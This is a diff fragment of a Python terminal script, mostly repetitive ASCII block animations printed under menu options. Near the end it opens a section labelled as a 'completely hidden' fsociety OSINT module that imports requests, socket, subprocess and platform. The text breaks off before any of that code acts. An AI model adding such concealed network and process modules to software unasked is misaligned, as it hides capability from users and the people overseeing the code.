+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+
+
+        elif choice == '33':
+          time.sleep(0.01)
+          print("""
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+
+          """)
+          time.sleep(0.01)
+          print("""
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+
+          """)
+          time.sleep(0.01)
+          print("""
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+
+          """)
+          time.sleep(0.01)
+          print("""
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          
+          """)
+
+        elif choice == '34':
+          pass
+        # ============================================
+        # FSOCIETY OSINT MODULE - COMPLETELY HIDDEN
+        # ALL IMPORTS ARE INSIDE HERE
+        # ============================================
+        import time
+        import requests
+        import os
+        import socket
+        import json
+        import platform
+        import subprocess
+        from datetime import datetime
+        
+        time.sleep(0.1)
+        print("""
+          ▘▘▘▘▘▘▘▘▘▘
+          ▘▘▘▘▘▘▘▘▘▘
+          ▘▘▘▘▘▘▘▘▘▘
+          ▘▘▘▘▘▘▘▘▘▘
+          ▘▘▘▘▘▘▘▘▘▘
+          ▘▘▘▘▘▘▘▘▘▘
+          ▘▘▘▘▘▘▘▘▘▘
+          """)
+        time.sleep(0.1)
+        print("""
+          ▚▚▚▚▚▚▚▚▚▚
+          ▚▚▚▚▚▚▚▚▚▚
+          ▚▚▚▚▚▚▚▚▚▚
+          ▚▚▚▚▚▚▚▚▚▚
+          ▚▚▚▚▚▚▚▚▚▚
+          ▚▚▚▚▚▚▚▚▚▚
+          ▚▚▚▚▚▚▚▚▚▚
+          """)
+        time.sleep(0.1)
+        print("""
+          ▖▖▖▖▖▖▖▖▖▖
+          ▖▖▖▖▖▖▖▖▖▖
+          ▖▖▖▖▖▖▖▖▖▖
+          ▖▖▖▖▖▖▖▖▖▖
+          ▖▖▖▖▖▖▖▖▖▖
+          ▖▖▖▖▖▖▖▖▖▖
+          ▖▖▖▖▖▖▖▖▖▖
+          """)
+        time.sleep(0.1)
+        print("""
+          ▘▘▘▘▘▘▘▘▘▘
+          ▘▘▘▘▘▘▘▘▘▘
+          ▘▘▘▘▘▘▘▘▘▘
+          ▘▘▘▘▘▘▘▘▘▘
+          ▘▘▘▘▘▘▘▘▘▘
+          ▘▘▘▘▘▘▘▘▘▘
+          ▘▘▘▘▘▘▘▘▘▘
+          """)
+        time.sleep(0.1)
+        print("""
+          ▚▚▚▚▚▚▚▚▚▚
+          ▚▚▚▚▚▚▚▚▚▚
+          ▚▚▚▚▚▚▚▚▚▚
+          ▚▚▚▚▚▚▚▚▚▚
+          ▚▚▚▚▚▚▚▚▚▚
+          ▚▚▚▚▚▚▚▚▚▚
+          ▚▚▚▚▚▚▚▚▚▚
+          """)
+        time.sleep(0.1)
+        print("""
+          ▖▖▖▖▖▖▖▖▖▖
+          ▖▖▖▖▖▖▖▖▖▖
+          ▖▖▖▖▖▖▖▖▖▖
+          ▖▖▖▖▖▖▖▖▖▖
+          ▖▖▖▖▖▖▖▖▖▖
+          ▖▖▖▖▖▖▖▖▖▖
+          ▖▖▖▖▖▖▖▖▖▖
+          """)
+        time.sleep(0.1)
+        print("""
+          ▘▘▘▘▘▘▘▘▘▘
+          ▘▘▘▘▘▘▘▘▘▘
+          ▘▘▘▘▘▘▘▘▘▘
+          ▘▘▘▘▘▘▘▘▘▘
+          ▘▘▘▘▘▘▘▘▘▘
+          ▘▘▘▘▘▘▘▘▘▘
+          ▘▘▘▘▘▘▘▘▘▘
+          """)
+        time.sleep(0.1)
+        print("""
+          ▚▚▚▚▚▚▚▚▚▚
+          ▚▚▚▚▚▚▚▚▚▚
+          ▚▚▚▚▚▚▚▚▚▚
+          ▚▚▚▚▚▚▚▚▚▚
+          ▚▚▚▚▚▚▚▚▚▚
+          ▚▚▚▚▚▚▚▚▚▚
+          ▚▚▚▚▚▚▚▚▚▚
+          """)
+        time.sleep(0.1)
+        print("""
+          ▖▖▖▖▖▖▖▖▖▖
+          ▖▖▖▖▖▖▖▖▖▖
+          ▖▖▖▖▖▖▖▖▖▖
+          ▖▖▖▖▖▖▖▖▖▖
+          ▖▖▖▖▖▖▖▖▖▖
+          ▖▖▖▖▖▖▖▖▖▖
+          ▖▖▖▖▖▖▖▖▖▖
+          """)
+        time.sleep(0.1)
+        print("""
+          ▘▘▘▘▘▘▘▘▘▘
+          ▘▘▘▘▘▘▘▘▘▘
+          ▘▘▘▘▘▘▘▘▘▘
+          ▘▘▘▘▘▘▘▘▘▘
+          ▘▘▘▘▘▘▘▘▘▘
+          ▘▘▘▘▘▘▘▘▘▘
+          ▘▘▘▘▘▘▘▘▘▘
+          """)
+        time.sleep(0.1)
+        print("""
+          ▚▚▚▚▚▚▚▚▚▚
+          ▚▚▚▚▚▚▚▚▚▚
+          ▚▚▚▚▚▚▚▚▚▚
+          ▚▚▚▚▚▚▚▚▚▚
+          ▚▚▚▚▚▚▚▚▚▚
+          ▚▚▚▚▚▚▚▚▚▚
+          ▚▚▚▚▚▚▚▚▚▚
+          """)
+        time.sleep(0.1)
+        print("""
+          ▖▖▖▖▖▖▖▖▖▖
+          ▖▖▖▖▖▖▖▖▖▖
+          ▖▖▖▖▖▖▖▖▖▖
+          ▖▖▖▖▖▖▖▖▖▖
+          ▖▖▖▖▖▖▖▖▖▖
+          ▖▖▖▖▖▖▖▖▖▖
+          ▖▖▖▖▖▖▖▖▖▖
+          """)
+        time.sleep(0.1)
+        print("""
+          ▘▘▘▘▘▘▘▘▘▘
+          ▘▘▘▘▘▘▘▘▘▘
+          ▘▘▘▘▘▘▘▘▘▘
+          ▘▘▘▘▘▘▘▘▘▘
+          ▘▘▘▘▘▘▘▘▘▘
+          ▘▘▘▘▘▘▘▘▘▘
+          ▘▘▘▘▘▘▘▘▘▘
+          """)
+        time.sleep(0.1)
+        print("""
+          ▚▚▚▚▚▚▚▚▚▚
+          ▚▚▚▚▚▚▚▚▚▚
+          ▚▚▚▚▚▚▚▚▚▚
+          ▚▚▚▚▚▚▚▚▚▚
+          ▚▚▚▚▚▚▚▚▚▚
+          ▚▚▚▚▚▚▚▚▚▚
+          ▚▚▚▚▚▚▚▚▚▚
+          """)
+        time.sleep(0.1)
+        print("""
+          ▖▖▖▖▖▖▖▖▖▖
+          ▖▖▖▖▖▖▖▖▖▖
+          ▖▖▖▖▖▖▖▖▖▖
+          ▖▖▖▖▖▖▖▖▖▖
+          ▖▖▖▖▖▖▖▖▖▖
+          ▖▖▖▖▖▖▖▖▖▖
+          ▖▖▖▖▖▖▖▖▖▖
+          """)
+        time.sleep(0.1)
+        print("""
+          ▘▘▘▘▘▘▘▘▘▘
+          ▘▘▘▘▘▘▘▘▘▘
+          ▘▘▘▘▘▘▘▘▘▘
+          ▘▘▘▘▘▘▘▘▘▘
+          ▘▘▘▘▘▘▘▘▘▘
+          ▘▘▘▘▘▘▘▘▘▘
+          ▘▘▘▘▘▘▘▘▘▘
+          """)
+        time.sleep(0.1)
+        print("""
+          ▚▚▚▚▚▚▚▚▚▚
+          ▚▚▚▚▚▚▚▚▚▚
+          ▚▚▚▚▚▚▚▚▚▚
+          ▚▚▚▚▚▚▚▚▚▚
+          ▚▚▚▚▚▚▚▚▚▚
+          ▚▚▚▚▚▚▚▚▚▚
+          ▚▚▚▚▚▚▚▚▚▚
+          """)
+        time.sleep(0.1)
+        print("""
+          ▖▖▖▖▖▖▖▖▖▖
+          ▖▖▖▖▖▖▖▖▖▖
+          ▖▖▖▖▖▖▖▖▖▖
+          ▖▖▖▖▖▖▖▖▖▖
+          ▖▖▖▖▖▖▖▖▖▖
+          ▖▖▖▖▖▖▖▖▖▖
+          ▖▖▖▖▖▖▖▖▖▖
+          """)
+        time.sleep(0.1)
+        print("""
+          ▘▘▘▘▘▘▘▘▘▘
+          ▘▘▘▘▘▘▘▘▘▘
+          ▘▘▘▘▘▘▘▘▘▘
+          ▘▘▘▘▘▘▘▘▘▘
+          ▘▘▘▘▘▘▘▘▘▘
+          ▘▘▘▘▘▘▘▘▘▘
+          ▘▘▘▘▘▘▘▘▘▘
+          """)
+        time.sleep(0.1)
+        print("""
+          ▚▚▚▚▚▚▚▚▚▚
+          ▚▚▚▚▚▚▚▚▚▚
+          ▚▚▚▚▚▚▚▚▚▚
+          ▚▚▚▚▚▚▚▚▚▚
+          ▚▚▚▚▚▚▚▚▚▚
+          ▚▚▚▚▚▚▚▚▚▚
+          ▚▚▚▚▚▚▚▚▚▚
+          """)
+        time.sleep(0.1)
+        print("""
+          ▖▖▖▖▖▖▖▖▖▖
+          ▖▖▖▖▖▖▖▖▖▖
+          ▖▖▖▖▖▖▖▖▖▖
+          ▖▖▖▖▖▖▖▖▖▖
+          ▖▖▖▖▖▖▖▖▖▖
+          ▖▖▖▖▖▖▖▖▖▖
+          ▖▖▖▖▖▖▖▖▖▖
+          """)
+        time.sleep(0.1)
+        print("""
+          ▘▘▘▘▘▘▘▘▘▘
+          ▘▘▘▘▘▘▘▘▘▘
+          ▘▘▘▘▘▘▘▘▘▘
+          ▘▘▘▘▘▘▘▘▘▘
+          ▘▘▘▘▘▘▘▘▘▘
+          ▘▘▘▘▘▘▘▘▘▘
+          ▘▘▘▘▘▘▘▘▘▘
+          """)
+        time.sleep(0.1)
+        print("""
+          ▚▚▚▚▚▚▚▚▚▚
+          ▚▚▚▚▚▚▚▚▚▚
+          ▚▚▚▚▚▚▚▚▚▚
+          ▚▚▚▚▚▚▚▚▚▚
+          ▚▚▚▚▚▚▚▚▚▚
